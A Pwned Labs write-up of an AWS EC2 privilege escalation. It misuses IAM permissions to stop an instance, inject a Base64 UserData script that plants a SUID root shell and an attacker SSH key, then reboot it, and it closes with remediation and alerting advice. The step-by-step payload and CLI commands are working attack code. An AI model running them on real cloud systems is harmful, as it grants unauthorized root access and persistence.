AWS EC2 UserData Privilege Escalation (Pwned Labs Write-Up)Lab Title: Command Injection / AWS IAM Misconfiguration to EC2 UserData Privilege EscalationPlatform: Pwned LabsTarget Architecture: AWS EC2, IAM, Linux HostAuthor: Lethabo Sangweni1. Executive SummaryDuring this lab, an initial access foothold was leveraged to inspect local AWS credentials and permissions. Enumeration revealed a misconfigured IAM policy granting sensitive EC2 management permissions (ec2:ModifyInstanceAttribute, ec2:StopInstances, ec2:StartInstances, ec2:DescribeInstances).  By stopping the target EC2 instance, injecting a custom Base64-encoded bash script into the instance's UserData attribute, and restarting the virtual machine, the payload executed with local root privileges upon system boot. This granted local host root escalation and persistence.  2. Technical Prerequisites & Required PermissionsThe privilege escalation vector relies on holding the following set of IAM permissions on the target EC2 resource:IAM PermissionAction / Impactec2:DescribeInstancesEnumerate instance IDs, status, and attached roles.ec2:StopInstancesShut down the targeted EC2 instance (required to modify UserData).ec2:ModifyInstanceAttributeModify the base64-encoded userData attribute.ec2:StartInstancesBoot the instance to trigger cloud-init payload execution.3. Attack Execution WalkthroughPhase 1: Reconnaissance & Target IdentificationFrom the compromised host session, retrieve the target instance ID via Instance Metadata Service (IMDSv1/v2) or AWS CLI:Bash# Retrieve current Instance ID via IMDS
INSTANCE_ID=$(curl -s http://169.254.169.254/latest/meta-data/instance-id)
echo "Target Instance ID: $INSTANCE_ID"

# Verify IAM permissions against EC2
aws ec2 describe-instances \
    --instance-ids $INSTANCE_ID \
    --query "Reservations[*].Instances[*].[InstanceId,State.Name,IamInstanceProfile.Arn]"
Phase 2: Weaponization (Payload Creation)Draft a script that grants SUID administrative privilege to /bin/bash or creates an elevated backdoor user.Bashcat << 'EOF' > malicious_userdata.sh
#!/bin/bash
# Pwned Labs EC2 UserData Privilege Escalation Payload

# Copy standard shell and assign SUID bit for root access
cp /bin/bash /tmp/rootbash
chmod xs /tmp/rootbash
chmod 4755 /tmp/rootbash

# Optional: Add persistence key to root authorized_keys
mkdir -p /root/.ssh
echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAI... attacker@pwnedlabs" >> /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys
EOF

# Encode payload to Base64 (required by EC2 API)
USERDATA_B64=$(base64 -w 0 malicious_userdata.sh)
Phase 3: Exploitation & Instance ManipulationOperational Note: Stopping a target instance interrupts service. On live client engagements, coordinate maintenance windows before running intrusive actions.Bash# 1. Stop the target EC2 instance
aws ec2 stop-instances --instance-ids $INSTANCE_ID

# 2. Wait until the instance reaches 'stopped' state
aws ec2 wait instance-stopped --instance-ids $INSTANCE_ID

# 3. Inject the Base64 UserData payload
aws ec2 modify-instance-attribute \
    --instance-id $INSTANCE_ID \
    --attribute userData \
    --value "$USERDATA_B64"

# 4. Restart the instance to trigger cloud-init execution as root
aws ec2 start-instances --instance-ids $INSTANCE_ID

# 5. Wait for instance boot completion
aws ec2 wait instance-running --instance-ids $INSTANCE_ID
Phase 4: Privilege Escalation VerificationLog back into the SSH/shell context once the server finishes booting and verify root access via the generated SUID binary:  Bash# Execute the SUID binary with preserved privileges
/tmp/rootbash -p

# Confirm elevated effective user ID (euid=0)
id
4. Key Takeaways & RemediationEnforce Least Privilege: Never pair ec2:ModifyInstanceAttribute with ec2:StopInstances and ec2:StartInstances for non-administrative deployment roles.Restrict Attribute Modification: If ec2:ModifyInstanceAttribute is required, utilize IAM Condition Keys (or Service Control Policies) to restrict modification actions strictly to safe attributes (e.g., disable modification of userData).CloudTrail Alerting: Configure real-time SOC alerting for ModifyInstanceAttribute API calls targeting the userData attribute, especially when immediately preceded by a StopInstances API event.
